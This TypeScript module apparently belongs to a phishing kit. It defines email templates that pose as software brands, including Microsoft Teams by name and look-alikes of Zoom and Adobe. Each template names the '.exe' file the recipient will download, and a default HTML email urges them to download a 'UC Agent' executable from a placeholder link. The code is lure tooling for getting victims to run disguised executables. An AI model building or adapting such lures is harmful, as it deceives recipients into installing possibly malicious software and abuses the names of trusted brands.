import fs from 'fs';
import path from 'path';

export interface EmailTemplate {
  id: string;
  name: string;
  brand: string;
  description: string;
  filename: string; // What the downloaded .exe will be named
  icon: string;
  colors: {
    primary: string;
    secondary: string;
  };
}

export const EMAIL_TEMPLATES: EmailTemplate[] = [
  {
    id: 'voice-note',
    name: 'Audio Recording',
    brand: 'AudioSync Pro',
    description: 'Professional voice recording and audio editing suite',
    filename: 'AudioSync-Pro.exe',
    icon: '🎤',
    colors: {
      primary: '#667eea',
      secondary: '#764ba2'
    }
  },
  {
    id: 'zoom-meeting',
    name: 'Video Conferencing', 
    brand: 'ZoomConnect Pro',
    description: 'Enterprise video meeting and collaboration platform',
    filename: 'ZoomConnect-Pro.exe',
    icon: '📹',
    colors: {
      primary: '#0084ff',
      secondary: '#0066cc'
    }
  },
  {
    id: 'adobe-creative',
    name: 'Creative Suite',
    brand: 'Creative Hub',
    description: 'Professional design and creative tools suite',
    filename: 'Creative-Hub.exe', 
    icon: '🎨',
    colors: {
      primary: '#ff0066',
      secondary: '#ff6600'
    }
  },
  {
    id: 'teams-enterprise',
    name: 'Enterprise Collaboration',
    brand: 'Microsoft Teams',
    description: 'Enterprise collaboration and productivity platform',
    filename: 'Microsoft-Teams.exe',
    icon: '📊',
    colors: {
      primary: '#464775',
      secondary: '#5b5fc7'
    }
  }
];

export function getEmailTemplate(templateId: string): string {
  try {
    const templatePath = path.join(process.cwd(), 'templates', `${templateId}.html`);
    return fs.readFileSync(templatePath, 'utf-8');
  } catch (error) {
    // Fallback to default UC Connect template
    return getDefaultTemplate();
  }
}

export function getDefaultTemplate(): string {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>UC Universal Connect - Agent Ready</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 30px;">
        <div style="text-align: center; margin-bottom: 30px;">
            <h1 style="color: #007acc;">🖥️ UC Universal Connect</h1>
            <h2 style="color: #333;">✅ Your Agent is Ready!</h2>
        </div>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="{{DOWNLOAD_LINK}}" 
               style="display: inline-block; background: linear-gradient(45deg, #007acc, #0056b3); color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                📥 Download UC Agent (.exe)
            </a>
        </div>
        
        <div style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">
            UC Universal Connect © 2026
        </div>
    </div>
</body>
</html>`;
}